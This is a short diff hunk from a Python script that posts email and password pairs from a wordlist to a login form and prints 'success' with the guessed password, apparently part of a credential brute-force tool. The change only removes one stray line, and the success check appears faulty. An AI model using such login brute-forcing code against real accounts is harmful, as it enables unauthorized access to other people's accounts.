@@ -43,7 +43,7 @@ try:
         pw=lines.strip()
         req=requests.post(url, data={'email':ids, 'pass':pw, 'submit':'submit'})
         req.content
-        gets=req.get
+
         if 'home' in url:
           print('success : '+pw)
           sys.exit(0.1)
